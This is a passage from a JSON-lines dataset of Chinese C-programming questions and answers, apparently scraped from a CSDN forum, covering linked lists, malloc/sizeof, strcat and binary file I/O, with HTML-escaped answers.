   ", "for", " (int i = longest; i >= ", "0", "; i--) {\n        ResultGet[j] = out[i] + ", "'0'", ";\n\n        j++;\n    }\n    ResultGet[j] = ", "'\\0'", ";\n}\n\nvoid BigMinus(char ia[], char ib[], char ResultGet[]) {\n    static char out[N], a[N], b[N];\n    int JW;", "//", "借位\n\n    ", "//", "初始化\n    memset(out, ", "0", ", sizeof(out));\n    memset(a, ", "0", ", sizeof(a));\n    memset(b, ", "0", ", sizeof(b));\n    memset(ResultGet, ", "0", ", sizeof(ResultGet));\n    strcpy(a, ia);\n    strcpy(b, ib);\n    ", "//", "先将数字倒序(因为列竖式时需要右对齐且从需要从右往左算)\n    reverse(a);\n    reverse(b);\n\n    ", "//", "取a,b之中最长的 长度？\n    int longest = strGetLongest(a, b);\n    ", "//", "换算为真实数字\n    str2numArry(a);\n    str2numArry(b);\n    ", "//", "因为转换为真实数字之后末尾的‘", "0", "’会变成‘\\", "0", "’，又因为数组经过倒序处理，所以先导零将变成字符串结尾 ", "'\\0'", " 将被忽略。\n\n    ", "//", "运算\n    JW = ", "0", ";\n    ", "for", " (int i = ", "0", "; i < longest; i++) {\n        out[i] = a[i] - b[i] - JW;\n        JW = ", "0", ";\n        ", "if", " (out[i] < ", "0", ") {\n            JW = ", "1", ";\n            out[i] += ", "10", ";\n        }\n    }\n\n    ", "//", "逆序输出ASCII\n    int j = ", "0", ";\n\n    ", "while", " (out[longest] == ", "0", " && longest > ", "0", ") {\n        longest--;\n    }\n    ", "for", " (int i = longest; i >= ", "0", "; i--) {\n        ResultGet[j] = out[i] + ", "'0'", ";\n\n        j++;\n    }\n    ResultGet[j] = ", "'\\0'", ";\n}\n\nvoid BigMultiply(char ia[], char ib[], char ResultGet[]) {\n    static char  out1[N][", "2", " * N], a[N+", "84", "], b[N];\n    static long long int out[", "2", " * N];\n    long long int JW;", "//", "进位\n    ", "//", "初始化\n    memset(out, ", "0", ", sizeof(out));\n    memset(out1, ", "0", ", sizeof(out1));\n    memset(a, ", "0", ", sizeof(a));\n    memset(b, ", "0", ", sizeof(b));\n    memset(ResultGet, ", "0", ", sizeof(ResultGet));\n    strcpy(a, ia);\n    strcpy(b, ib);\n\n    ", "//", "先将数字倒序(因为列竖式时需要右对齐且从需要从右往左算)\n    reverse(a);\n    reverse(b);\n\n    int la = strlen(a);\n    int lb = strlen(b);\n    int longest = strGetLongest(a, b) + ", "1", ";", "//", "中间过程结果长度可能的最大值\n    int longest_out = la + lb;", "//", "结果可能的最长长度\n    ", "//", "换算为真实数字\n    str2numArry(a);\n    str2numArry(b);\n    ", "//", "因为转换为真实数字之后末尾的‘", "0", "’会变成‘\\", "0", "’，又因为数组经过倒序处理，所以先导零将变成字符串结尾 ", "'\\0'", " 将被忽略。\n    ", "//", "运算\n    JW = ", "0", ";\n\n    ", "for", " (int i = ", "0", "; i < lb; i++) {\n        ", "for", " (int k = ", "0", ", m = i; k < longest + i; k++, m++) {", "//", "数组序列是从零开始的，用<\n            out1[i][m] = b[i] * a[k] + JW;\n            JW = ", "0", ";\n            ", "if", " (out1[i][m] >= ", "10", ") {\n                JW = out1[i][m] / ", "10", ";\n                out1[i][m] %= ", "10", ";\n            }\n            \n            printf(", "\"%d \"", ", out1[i][k]);\n        }\n        putchar(", "'\\n'", ");\n    }\n    putchar(", "'\\n'", ");\n    putchar(", "'\\n'", ");\n\n    \n    ", "//", "char test[", "50", "][", "50", "] = { {", "1", ",", "2", ",", "3", "},{", "1", ",", "1", ",", "1", "},{", "1", ",", "1", ",", "1", "} };\n    ", "//", "lb是实际列数\n    ", "for", " (int i = ", "0", "; i < longest_out; i++) {\n        out[i] = out1[", "0", "][i];\n    }\n    \n    ", "for", " (int i = ", "1", "; i < lb; i++) {\n        JW = ", "0", ";\n        ", "for", " (int j = ", "0", "; j <= longest_out; j++) {\n            out[j] += out1[i][j] + JW;\n            ", "//i", "f(out[j] < ", "0", " || out[j] > ", "9223372036854775000", ") ", "exit", "(", "0", ");", "//", "test\n            JW = ", "0", ";\n            ", "if", " (out[j] >= ", "10", ") {\n                JW = out[j] / ", "10", ";\n                out[j] %= ", "10", ";\n            }\n            ", "//i", "f (out[j] > ", "10", ") ", "exit", "(", "0", ");", "//", "test\n            ", "//i", "f (JW > ", "10", ") ", "exit", "(", "0", ");", "//", "test\n        }\n\n        \n    }\n\n\n\n    ", "//", "working\n    int j = ", "0", ";\n    ", "while", " (out[longest_out] == ", "0", " && longest_out > ", "0", ") {\n        longest_out--;\n    }\n    ", "for", " (int i = longest_out; i >= ", "0", "; i--) {\n        ResultGet[j] = out[i] + ", "'0'", ";\n        ", "//", "printf(", "\"%d\"", ",out[i]);\n        j++;\n    }\n    ResultGet[j] = ", "'\\0'", ";\n}\nint main() {\n    ", "//i", "nt T;\n    static char a[N], b[N], out[", "2", " * N];\n    /*\n    scanf(", "\"%d\"", ", &T);\n    ", "for", " (int i = ", "1", "; i <= T; i++) {\n        scanf(", "\"%s%s\"", ", a, b);\n        BigPlus(a, b, out);\n        printf(", "\"Case %d:\\n%s + %s = %s\\n\\n\"", ", i, a, b, out);\n    }\n    */\n    ", "while", " (", "1", ") {\n        scanf(", "\"%s%s\"", ", a, b);\n        BigMultiply(a, b, out);\n        printf(", "\"%s\"", ", out);\n        putchar(", "'\\n'", ");\n    }\n\n    return ", "0", ";\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof返回参数类型所需要存储的字节数&amp;#xff1b;所以不管你a&amp;#43;b&amp;#43;c等于多少都好&amp;#xff0c;任然是int类型&amp;#xff0c;所以sizeof&amp;#xff08;a&amp;#43;b&amp;#43;c&amp;#xff09;等于sizeof&amp;#xff08;int&amp;#xff09;&amp;#xff0c;int类型在32位和64位编译器中都占4个字节&amp;#xff0c;所以答案是&amp;#xff1a;4个字节&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言程序设计的内容", ["C语言中当，a，b，c都是int型，sizeof（a+b+c）是多少"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;代码补充并完善如下&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;malloc.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;node&lt;/span&gt; { &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; val; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;node&lt;/span&gt;* next; }NODE;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;insert&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(NODE* list, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; x)&lt;/span&gt; &lt;/span&gt;{\n    NODE* u, * v, * p;\n    u &amp;#61; list; \n    v &amp;#61; u-&amp;gt;next;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; ( v!&amp;#61;&lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt; &amp;amp;&amp;amp; x &amp;lt; v-&amp;gt;val) &lt;span class=\"hljs-comment\"&gt;/* 寻找插入位置 */&lt;/span&gt;  &lt;span class=\"hljs-comment\"&gt;//(1)&lt;/span&gt;\n    {\n        u &amp;#61; v; \n        v &amp;#61; v-&amp;gt;next; \n    }\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (v &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt; || x &amp;gt; v-&amp;gt;val ) {  &lt;span class=\"hljs-comment\"&gt;//(2)&lt;/span&gt;\n        &lt;span class=\"hljs-comment\"&gt;/* 判是否要插入新节点 */&lt;/span&gt;\n        p &amp;#61; (NODE*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(NODE));\n        p-&amp;gt;val &amp;#61; x; &lt;span class=\"hljs-comment\"&gt;/* 生成新节点 */&lt;/span&gt;\n        p-&amp;gt;next &amp;#61; v;  &lt;span class=\"hljs-comment\"&gt;//(3)&lt;/span&gt;\n        u-&amp;gt;next &amp;#61; p; &lt;span class=\"hljs-comment\"&gt;/* 插入新节点*/&lt;/span&gt; &lt;span class=\"hljs-comment\"&gt;//(4)&lt;/span&gt;\n    }\n}\n&lt;span class=\"hljs-comment\"&gt;// 求以上链表中所有整数之和&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;Sum&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(NODE* head)&lt;/span&gt;\n&lt;/span&gt;{\n    NODE* p &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; s &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (head &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;) &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    p &amp;#61; head-&amp;gt;next;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p !&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n    {\n        s &amp;#43;&amp;#61; p-&amp;gt;val;\n        p &amp;#61; p-&amp;gt;next;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; s;\n}\n&lt;span class=\"hljs-comment\"&gt;// 将以上链表所占的内存释放&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;Destory&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(NODE** head)&lt;/span&gt;\n&lt;/span&gt;{\n    NODE* p;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (*head)\n    {\n        p &amp;#61; (*head)-&amp;gt;next;\n        &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(*head);\n        *head &amp;#61; p;\n    }\n    *head &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt; \n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; x; NODE* head, *p; &lt;span class=\"hljs-comment\"&gt;/* 首先建立只有辅助节点的空链表 */&lt;/span&gt;\n    head &amp;#61; (NODE*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(NODE));\n    head-&amp;gt;next &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;; &lt;span class=\"hljs-comment\"&gt;//(5)&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Enter integers:\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (&lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;x) &amp;#61;&amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;) &lt;span class=\"hljs-comment\"&gt;/* 反复读入整数插入链表 */&lt;/span&gt;\n        &lt;span class=\"hljs-built_in\"&gt;insert&lt;/span&gt;(head, x);\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (p &amp;#61; head-&amp;gt;next; p!&amp;#61;&lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;; p &amp;#61; p-&amp;gt;next)\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\t&amp;#34;&lt;/span&gt;, p-&amp;gt;val);\n\n    &lt;span class=\"hljs-comment\"&gt;//求链表的和&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;\\nSum&amp;#61;%d\\n&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;Sum&lt;/span&gt;(head));\n    &lt;span class=\"hljs-comment\"&gt;//释放链表内存&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;Destory&lt;/span&gt;(&amp;amp;head);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n\n\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["怎么把这种链表程序补充完整啊？", ["本程序从键盘读入整数，并按从大到小的顺序输出输入正整数中互不相等的那些整数。程序以便读入整数，以便构造一个从大到 小顺序链接的的链表，直至不能从键盘读入整数，然后顺序输出链表上各节点的整数值。主函数每读入一个整数，就调用函数insert(),函数in sert()将还未出现杂链表上的正数按从大到小的顺序插如到链表中。 为了插入方便，链表杂表首有一个辅助节点。", "#include ＜studio. h>", "#include <malloc. h>", "typedef struct node{ int val; struct node *next; }NODE;", " void insert(NODE *list,int x){", " NODE *u,*v,*p;", " u=list;v=u->nest;", "while((1)&&xval) /", "寻找插入位置", "/", "{u=v;v=v->nest;}", "if(v==NULL|| (2) ){ /", "判是否要插入新节点", "/", " p=(NODE *)malloc(sizeof(NODE));", " p->val=x; /", "生成新节点", "/", " (3) =v;", "(4) =p; /", "插入新节点", "/ } }", "mian(){ int x; NODE *head,", "p; /", "首先建立只有辅助节点的空链表", "/", "head=(NODE", ")malloc(sizeof(NODE));", "(5) =NULL;", " printf(\"Enter integers:\\n\");", "while(scanf(\"%d\",&x)==1) /", "反复读入整数插入链表", "/", "insert(head,x);", "for(p=head->next;p!->NULL;p=p->next)", "printf(\"%d\\t\", p->val); }", "[问题] 1、写出上面带标号1-5的括号中该填入的内容；", "2、写一个函数Sum，求以上链表中所有整数之和", "3、写一个函数Destory,将以上链表所占的内存释放。"]], "Tag": "程序设计"}
{"Answer": "https://ask.csdn.net/questions/686858\r\n\r\n只要回答排在前面，不管是灌水还是抄袭,lz都会采纳？那么还回答个什么劲啊。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于C语言中动态分配的一些问题", ["有程序实现对零件的：插入，更新数量，输入价格，输入数量等功能", "\n现要求修改结构数组，从之前的提前确定数组长度，改为malloc动态分配，并在数组满了之后，用realloc增加分配的内存。", "\n为了便于测试，我先为数组分配了1倍于struct part的内存如下：", "\nint max_parts==1;", "\nstrcut part *inventory;", "\ninventory=malloc(max_parts*sizeof(struct part));", "\n我理解的是，如果我输入一个零件的信息（编号名字数量价格等）后，此次动态分配的地址就会被填满。事实却不是这样，当我输入两个零件的信息的时候，仍旧正常显示，第三个零件后，才出现问题：零件名和编号是正确显示的，而数量这一项是一个超大的值。价格是0.00。", "\n第二个问题，我看了答案，答案用inventory==NULL；来判断动态分配是否填满。这个我不理解，inventory永远都指向一块空间，并且没有对它的其他操作，即使满了，也是指向非NULL的空间，怎么会==NULL呢？是哪一步操作让它“哪里都不指向”的？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;有没有数据域主要看你自己的实现&amp;#xff0c;两种方式都是可以的。&lt;br /&gt;L &amp;#61; (LNode * )malloc(sizeof(LNode));这句话中&amp;#xff0c;malloc用于申请内存空间&amp;#xff0c;内存空间的大小是结构体LNode的大小&amp;#xff0c;malloc申请的内存返回值类型是void *&amp;#xff0c;所以需要(LNode * )来强制转换一下。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言数据结构问题，初始化头指针", ["void", " ", "InitList", "(LNode *&L)", "{\n    L = (LNode * )", "malloc", "(", "sizeof", "(LNode));\n    L -> next = ", "NULL", ";\n}\n", "\n", "C语言的这串代码，在定义头指针时，头指针的所在的节点有没有数据域？", "是上面的形式，还是下面的", "\n", "如何解读这串代码//L = (LNode * )malloc(sizeof(LNode));"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;linek是指针&amp;#xff0c;你申请了一个7个指针的数组&amp;#xff0c;但是没有申请空间就开始用了&amp;#xff0c;不奔溃就怪&amp;#xff0c;不是不让输入&amp;#xff0c;而是异常退出。还有make函数用了递归&amp;#xff0c;但是没有退出条件。先打好基础再继续吧&amp;#xff0c;或者先看看别人的代码&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["程序不让输入就直接结束了", ["#include<stdio.h>", "#include<stdlib.h>", "typedef struct line", "{", " int a;", " struct line *f;", "}line,*linek;", "void make(linek n[],int v,int e,int r,int u[])", "{", "    linek p;", "    u[v]=1;", "    p=n[v]->f;", "    while(p!=NULL)", "    {", "        v=p->a;", "        if(u[v]!=1)", "        {", "            if(v==r)", "        {", "            printf(\"1\");", "            break;", "        }", "            make(n,v,e,r,u);", "        p=p->f;", "    }", "    }", "    }", "int main()", "{", "    linek n[7];", "    int i;", "    n[0]->a=0;", "    n[0]->f=NULL;", "    for(i=1;i<7;i++)", "    {", "        n[i]->a=i;", "        n[i]->f=NULL;", "    }", "    linek p,y;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=2;", "    n[1]->f=p;", "    y=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=4;", "    y->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=5;", "    n[2]->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=6;", "    n[3]->f=p;", "    y=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=5;", "    y->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=2;", "    n[4]->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=4;", "    n[5]->f=p;", "    p=(linek)malloc(sizeof(line));", "    p->f=NULL;", "    p->a=6;", "    n[6]->f=p;", "    int v;", "    int e,r;", "    scanf(\"%d%d\",&e,&r);", "    v=e;", "    int u[7]={0,0,0,0,0,0,0};", "    make(n,v,e,r,u);", "    return 0;", "}"]], "Tag": "程序设计"}
{"Answer": "```\r\n #include &lt;stdio.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;string.h&gt;\r\n\r\nint main()\r\n{\r\n\tchar *argv[]={\"/home/\",\"a\"};\r\n\tchar *p=argv[0];\r\n\tchar *filename=argv[1];\r\n\tputs(filename);puts(p);\r\n\tchar *r=(char *)malloc(sizeof(char)*512);\r\n\tmemset(r, 0, 512); //这里\r\n\tstrcat(r,filename);\r\n\tstrcat(r,p);\r\n\tputs(r);\r\n   \r\n   return 0;\r\n}\r\n```\r\n![图片说明](https://img-ask.csdn.net/upload/201810/29/1540816930_431059.gif)\r\n\r\n`如果问题得到解决，麻烦点下我回答右边的采纳，谢谢`", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言关于字符串连接函数strcat，连接之后出现乱码", ["结果不应该是a/home/ 吗？ 前面三个是什么东西= =", "\n        int main(){", "\n    char ", "argv[]={\"/home/\",\"a\"};", "\n    char *p=argv[0];", "\n    char *filename=argv[1];", "\n    puts(filename);puts(p);", "\n    char *r=(char", ")malloc(sizeof(char)*512);", "\n    strcat(r,filename);", "\n    strcat(r,p);", "\n    puts(r);", "\n}"]], "Tag": "程序设计"}
{"Answer": "delete p; // delete一个指针是释放其指向的内存区域 指针的值就会变成一个随机值 （野指针）\r\n 并不会，是指针指向的内存被回收，可能会被别的地方重新分配而改写，但是指针本身不会变成一个随机值", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于链表中指针的问题", ["#include<iostream>\n\nusing namespace std;\n\ntypedef struct Node{\n    char data;\n    Node* next;\n}Node,*LinkList; //链表结构单元的声明\n\nvoid InitList(LinkList* L) //参数是链表结构单元的二级指针 初始化函数没有返回值\n{\n     *L = (LinkList)malloc(sizeof(Node));\n    (*L)->next = NULL;\n}\n\nvoid create_From_Head(LinkList L) //头插法建立链表\n{\n    Node* s;\n    char c;\n    int flag = 1;\n\n    while (flag)\n    {\n        cin >> c;\n        if (c != '#')\n        {\n            s = (LinkList)malloc(sizeof(Node));\n            s->data = c;\n\n            s->next = L->next;\n            L->next = s;\n        }\n        else flag = 0;\n    }\n\n}\n\n\nvoid create_From_Tail(LinkList L)\n{\n    LinkList s, r = L; \n    int flag = 1;\n    char c;\n\n    while (flag)\n    {\n        cin >> c;\n        if (c != '#')\n        {\n            s = (LinkList)malloc(sizeof(Node));\n            s->data = c;\n\n            r->next = s;\n            r = s; // 这里将尾巴断开了 最后一个元素之后指向的区域未知 \n        }\n        else\n        {\n            flag = 0;\n            r->next = NULL;// 将尾巴补充完整 可以完成完成的遍历过程\n        }\n    }\n}\n\nvoid print(LinkList L)\n{\n    LinkList temp = L->next;\n\n    while (temp != NULL)\n    {\n        cout << temp->data << \" \";\n        temp = temp->next;\n    }\n\n    cout << \"End of the total run\" << endl;\n}\n\nvoid deList(LinkList L)\n{\n    LinkList q,p = L;\n    while (p != NULL)\n    {\n        q = p->next;\n        delete p; // delete一个指针是释放其指向的内存区域 指针的值就会变成一个随机值 （野指针）\n        p = q;\n    }\n    L = NULL; //头结点指向的内存已经都给扬了 可以delete头指针\n\n    //所有的结点都被delete了一次 所有的指针指向的内存都被释放了一次 这一系列的指针都成为了野指针 \n}\n\nint main(void)\n{\n    //Node S;\n    //LinkList List = &S, * L = &List;\n    //List->next = NULL;\n\n    LinkList List, * L = &List;\n    InitList(L); //初始化指针是修改指针的值 必须使用双指针否则 就会在初始化函数里面被创建一个副本 无法将修改真正实现\n\n    create_From_Head(List);\n\n    print(List);\n\n    //deList(List);\n\n    create_From_Tail(List);\n\n    print(List);\n\n    return 0;\n}\n", "\n\n", "问题我写在代码的最后deList里面了 代码太长了 麻烦给位大佬看看", "\n想了好久了都没想过"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;分析你的存储文件的代码可以看到&amp;#xff0c;你存储的是二进制数据&amp;#xff0c;并不是文本数据&amp;#xff0c;虽然扩展名是  .txt。&lt;br /&gt;文件打开模式要用二进制模式&amp;#xff0c;你没写模式&amp;#xff0c;那默认就是文本模式&amp;#xff0c;用文本模式去读取二进制数据&amp;#xff0c;是会发生转义错误的。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["用fwrite写入double数据后用fread读不出来", ["把menu_t的double类型数据改为int数据之后就可以正常读取了，这是不是意味着写入的时候出了问题", "这是我的代码。", "#include<stdio.h>", "#include\"CFile.h\"", "#include\"Clist.h\"", "#include<string.h>", "#include<stdlib.h>", "void File_Userread();", "int userCount=3;", "int menuCount=3;", "void File_Userwrite(USER_T user[]);", "void File_Menuread();", "void File_Menuwrite(MENU_T arr[]);", "\n", "USER_T userArr[10]={", "    {1001,\"Lily\",\"123123\",1},", "    {1002,\"Tony\",\"123456\",2},", "    {1003,\"Bot\",\"123321\",3}", "                    };", "\n", "MENU_T menuArr[10]={", "    {1001,\"肉蛋葱鸡\",\"下饭神器\",6},", "    {1002,\"不响丸\",\"麻辣\",7},", "    {1003,\"肾炝洗鲤\",\"好吃多一点点\",8}", "                        };", "int main()", "{", "\n", "File_Userwrite(", "userArr", ")", ";\n", "File_Userread()", ";\n\n", "File_Menuwrite(", "menuArr", ")", ";\n", "File_Menuread()", ";\n\nreturn ", "0", ";\n", "\n", "}", "\n", "void File_Userread()", "{", "    //1.文件打开", "    FILE *fp=NULL;", "    USER_T *puser =NULL;", "    LIST_T *userhead=list_init();", "    fp=File_open(\"data/user.txt\");", "    if(NULL == fp)", "    {", "        printf(\"打开失败\\n\");", "        exit(0);", "    }", "    else", "        printf(\"打开成功\\n\");", "    //2.指针位置设置开头位置", "    rewind(fp);", "    puser =(USER_T *)malloc(sizeof(USER_T));", "    memset(puser,0,sizeof(USER_T));", "    //3.读取数据", "    while(fread(puser,sizeof(USER_T),1,fp)>0)", "    {", "        listAdd(userhead,puser);//添加到用户结构体链表中", "        printf(\"id=%d,name=%s,pwd=%s,role=%d\\n\",puser->id,puser->name,puser->pwd,puser->role);", "    }", "    //4.文件关闭", "    fclose(fp);", "}", "\n", "void File_Userwrite(USER_T user[])", "{", "    int i=0;", "    FILE *fp=NULL;", "    fp=File_open(\"data/user.txt\");", "    if(NULL == fp)", "    {", "        printf(\"打开失败\\n\");", "        exit(0);", "    }", "    else", "    {", "        printf(\"打开成功\\n\");", "    }", "    //2.文件定位", "    rewind(fp);", "    //3.文件写入", "    for(i=0;i<userCount;i++)", "    {", "        fwrite(&user[i],sizeof(USER_T),1,fp);", "        fflush(fp);", "    }", "    fclose(fp);", "\n", "}", "\n", "void File_Menuread()", "{", "    //1.文件打开", "    FILE *Menufp=NULL;", "    MENU_T *pmenu =NULL;", "    LIST_T *menuhead=list_init();", "    Menufp=File_open(\"data/menu.txt\");", "    if(NULL == Menufp)", "    {", "        printf(\"打开失败\\n\");", "        exit(0);", "    }", "    else", "        printf(\"打开成功\\n\");", "    //2.指针位置设置开头位置", "    rewind(Menufp);", "\n", "pmenu =(MENU_T *)malloc(sizeof(MENU_T));\nmemset(pmenu,", "0", ",sizeof(MENU_T));\n", "//3.读取数据", "\n", "while", "(fread(pmenu,sizeof(MENU_T),", "1", ",Menufp)>", "0", ")\n{\n    listAdd(menuhead,pmenu);", "//添加到用户结构体链表中", "\n    ", "printf", "(\"id=%d,", "name", "=%s,info=%s,price=%d\\n\",pmenu->", "id", ",pmenu->", "name", ",pmenu->", "info", ",pmenu->", "price);\n}\n", "//4.文件关闭", "\nfclose(Menufp);\n", "\n", "}", "\n", "void File_Menuwrite(MENU_T arr[])", "{", "    int i=0;", "    FILE *Menufp=NULL;", "    Menufp=File_open(\"data/menu.txt\");", "    if(NULL == Menufp)", "    {", "        printf(\"打开失败\\n\");", "        exit(0);", "    }", "    else", "    {", "        printf(\"打开成功\\n\");", "    }", "    //2.文件定位", "    rewind(Menufp);", "    //3.文件写入", "    for(i=0;i<menuCount;i++)", "    {", "        fwrite(&arr[i],sizeof(MENU_T),1,Menufp);", "    }", "    fflush(Menufp);", "    fclose(Menufp);", "\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你这是有头节点的链表&amp;#xff0c;所以头节点不需要输出的。&lt;br /&gt;p &amp;#61; p-&amp;gt;next;&lt;br /&gt;while(p!&amp;#61;NULL)&lt;br /&gt;{printf(&amp;#34;%s %s&amp;#34;,p-&amp;gt;num,p-&amp;gt;name);&lt;br /&gt;p&amp;#61;p-&amp;gt;next;&lt;br /&gt;}&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["单链表打印出来为什么是乱码", ["void headinsert(linklist head)", "{int i;", "linklist s,p;", "head=(linklist)malloc(sizeof(lnode));", "p=(linklist)malloc(sizeof(lnode));", "p=head;", "head->next=NULL;", "printf(\"请输入学号与姓名\");", "for(i=0;i<n;i++)", "{s=(linklist)malloc(sizeof(lnode));", "scanf(\"%s%s\",s->num,s->name);", "s->next=head->next;", "head->next=s;", "}", "while(p!=NULL)", "{printf(\"%s %s\",p->num,p->name);", "p=p->next;", "}", "return head;", "}"]], "Tag": "程序设计"}
{"Answer": "循环创建链表时的node是一个孤立的新申请空间的指针\r\nnode-&gt;score=i;  是给这个新的孤立的指针赋值\r\n\r\nend-&gt;next=node;是把链表里最后一块空间和这个新申请的空间（指针）连接起来\r\n\r\nnode-&gt;next=NULL;是把这个指针的next域初始化置为空，前面已经把指针的score数据赋值过了\r\n然后node的数据域和next都初始化有值之后，node已经被链接到链表上了，成为链表最后一个元素\r\n然后end=node;\r\n即更新end让它指向链表最后一个元素\r\n\r\n帮到你的话采纳一下", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["链表创建结构的问题！！！！！！", ["\n\n", "typedef struct student", "\n{", "\nint score;", "\nstruct student ", "next;       //创建一个链表，包含数据和指针 ", "\n} LinkList;", "\n//创建一个列表 ", "\nLinkList *CreateList(int n)", "\n{", "\n  int i;", "\n  LinkList *head,*node,*end;                    //定义一个头结点 ", "\n  head=(LinkList", ")malloc(sizeof(LinkList));     //给头结点申请内存 ", "\n  end=head;                                     // ", "\n  end->next=NULL;                               //链表最后一个结点的指针为空 ", "\n\n", "for(i=0;i<n;i++)                              //循环创建链表 ", "\n  {", "\n\n", "  node=(LinkList*)malloc(sizeof(LinkList));\n  node->score=i;                            //给结点数据赋值 \n  end->next=node;\n   printf(\"第 %d 个节点的数值：%d\\n\",i,node->score);\n  node->next=NULL;\n  end=node;\n", "\n\n", "}", "\n  return head;", "\n}", "\nint main()", "\n{", 